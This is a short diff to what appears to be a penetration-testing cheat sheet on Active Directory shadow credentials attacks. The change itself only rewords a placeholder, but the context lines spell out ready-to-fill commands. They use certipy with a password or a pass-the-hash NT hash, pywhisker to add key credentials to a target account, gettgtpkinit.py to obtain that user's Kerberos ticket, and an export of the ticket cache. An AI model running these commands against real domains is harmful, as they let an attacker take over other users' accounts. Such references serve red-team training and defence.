@@ -15,9 +15,9 @@ ____________________________________________________
 
  You can do this attack with password or NT Hash wit pass the hash technique:
  
-` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user> `
+` < kerberos sync clock command > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user> `
 
-` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
+` < kerberos sync clock command > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
 
 ### SHADOW CREDENTIALS ATTACK (old school method, with pywisker):
@@ -34,7 +34,7 @@ ____________________________________________________
 
 ` pywhisker -d "< domain >" -u "< user you control>" -p "< password >" --target "<target user>" --action "add" `
 
-` < kerberos sync clock > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache `
+` < kerberos sync clock command > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache `
 
 ` export KRB5CCNAME=<target user>.ccache `
 
